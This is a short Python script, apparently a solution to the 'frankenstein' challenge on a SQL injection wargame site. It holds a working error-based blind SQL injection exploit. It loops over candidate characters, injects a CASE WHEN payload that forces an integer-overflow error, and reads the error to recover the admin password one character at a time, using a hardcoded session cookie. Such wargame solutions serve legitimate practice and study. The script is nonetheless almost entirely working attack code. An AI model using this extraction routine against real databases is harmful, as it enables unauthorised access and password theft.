import string
import requests

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookies = {"PHPSESSID" : "595dl7ejl1io50mt9bhg0dbmpk"}
params = {"pw" : None}


domain = string.digits + string.ascii_lowercase

# 비밀번호
pw = ''
for i in range(30):
    for j in domain:
        payload = "' or id='admin' and case when pw like '{}%' then 123412341234*123412341234 end#".format(pw+j)
        params["pw"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        #print(response.text)
        if(response.text.count("error") == 1):
            pw += j
            print("find the pw",pw)
            break
    if(j == domain[-1]):
        print("finish find the pw",pw)
        break